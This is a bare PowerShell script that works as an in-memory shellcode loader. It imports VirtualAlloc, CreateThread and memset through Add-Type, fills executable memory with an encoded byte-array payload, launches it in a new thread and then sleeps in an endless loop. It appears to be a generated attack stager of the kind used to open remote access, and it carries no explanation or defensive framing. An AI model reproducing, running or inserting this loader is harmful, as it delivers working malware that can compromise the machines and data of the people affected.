
$Nu5 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Nu5 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc1,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xba,0x7c,0x41,0x82,0x8e,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x80,0xa3,0x77,0x72,0x90,0xa6,0x78,0x8b,0x60,0xc7,0xf1,0x6e,0x51,0xc7,0x66,0xfa,0xc1,0xf7,0xed,0xae,0xed,0x7c,0xa3,0x5a,0x66,0xf0,0x6c,0x6c,0xcf,0xbf,0x4a,0x43,0xd0,0xec,0xaf,0xc2,0x52,0xef,0xe3,0x24,0x6b,0x20,0xf6,0x25,0xac,0x5d,0xfb,0x74,0x65,0x29,0xae,0x68,0x02,0x67,0x73,0x02,0x58,0x69,0xf3,0xf7,0x28,0x88,0xd2,0xa9,0x23,0xd3,0xf4,0x48,0xe0,0x6f,0xbd,0x52,0xe5,0x4a,0x77,0xe8,0xdd,0x21,0x86,0x38,0x2c,0xc9,0x25,0x05,0x81,0x38,0x37,0x41,0x25,0xa3,0x42,0xbb,0x56,0x5e,0x55,0x78,0x25,0x84,0xd0,0x9b,0x8d,0x4f,0x42,0x40,0x2c,0x83,0x15,0x03,0x22,0x68,0x51,0x4b,0x26,0x6f,0xb6,0xe7,0x52,0xe4,0x39,0x28,0xd3,0xbe,0x1d,0xec,0xb8,0x65,0x3f,0xb5,0x64,0xcb,0x40,0xa5,0xc7,0xb4,0xe4,0xad,0xe5,0xa1,0x94,0xef,0x61,0x05,0x95,0x0f,0x71,0x01,0xae,0x7c,0x43,0x8e,0x04,0xeb,0xef,0x47,0x83,0xec,0x10,0x72,0x73,0x62,0xef,0x7d,0x84,0xaa,0x2b,0x29,0xd4,0xc4,0x9a,0x52,0xbf,0x14,0x23,0x87,0x2a,0x10,0xb3,0x7d,0xcd,0x54,0xb4,0x16,0x13,0x69,0x3b,0x5c,0x9a,0x8f,0x6b,0xf2,0xcd,0x1f,0xcb,0xa2,0xad,0xcf,0xa3,0xa8,0x21,0x2f,0xd3,0xd2,0xeb,0x58,0x79,0x3d,0x42,0x30,0x15,0xa4,0xcf,0xca,0x84,0x29,0xda,0xb6,0x86,0xa2,0xe9,0x47,0x48,0x43,0x87,0x5b,0x3c,0xa3,0xd2,0x06,0xea,0xbc,0xc8,0x2d,0x12,0x29,0xf7,0xe7,0x45,0xc5,0xf5,0xde,0xa1,0x4a,0x05,0x35,0xba,0x43,0x93,0xf6,0xd4,0xab,0x73,0xf7,0x24,0xfa,0x19,0xf7,0x4c,0x5a,0x7a,0xa4,0x69,0xa5,0x57,0xd8,0x22,0x30,0x58,0x89,0x97,0x93,0x30,0x37,0xce,0xd4,0x9e,0xc8,0x25,0xe5,0xe3,0x1e,0x03,0x93,0x0d,0xa3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$6qpx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($6qpx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$6qpx,0,0,0);for (;;){Start-sleep 60};
